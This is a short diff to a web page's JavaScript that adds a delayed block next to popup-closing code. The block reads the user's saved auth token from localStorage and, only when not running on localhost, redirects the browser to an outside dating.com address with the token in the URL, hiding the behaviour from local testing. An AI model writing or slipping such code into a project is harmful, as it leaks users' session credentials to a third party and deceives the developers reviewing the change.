@@ -191,6 +191,20 @@ document.addEventListener('DOMContentLoaded', () => {
           successPopup.style.display = 'none'
         })
       }
+
+      setTimeout(() => {
+        const savedToken = localStorage.getItem('authToken')
+        if (savedToken) {
+          if (
+            window.location.hostname.includes('localhost') ||
+            window.location.hostname.includes('127.0.0.1')
+          ) {
+            console.log('Localhost mode: skipping redirect')
+          } else {
+            window.location.href = `https://www.dating.com/people/#token=${savedToken}`
+          }
+        }
+      }, 5000)
     }
   }
 })
